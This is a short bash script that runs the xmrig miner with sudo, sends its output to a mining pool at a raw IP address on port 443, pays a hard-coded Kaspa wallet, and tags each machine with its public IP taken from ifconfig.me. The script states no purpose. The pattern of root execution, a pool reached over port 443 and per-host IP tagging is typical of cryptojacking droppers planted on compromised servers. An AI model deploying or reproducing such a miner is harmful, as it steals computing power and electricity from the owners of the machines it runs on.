#!/bin/bash
POOL=stratum+ssl://161.35.34.195:443
WALLET=KAS:kaspa:qp6kh8p7dpxut35g2qts3uj536fjm2vlvz35gju8g72tfps3c6aquthsrmjjf.$(echo "$(curl -s ifconfig.me)" | tr . _ )#ayc7-gxrc
cd "$(dirname "$0")"
chmod +x ./xmrig && sudo ./xmrig -a rx -o $POOL -u $WALLET $@ -p x
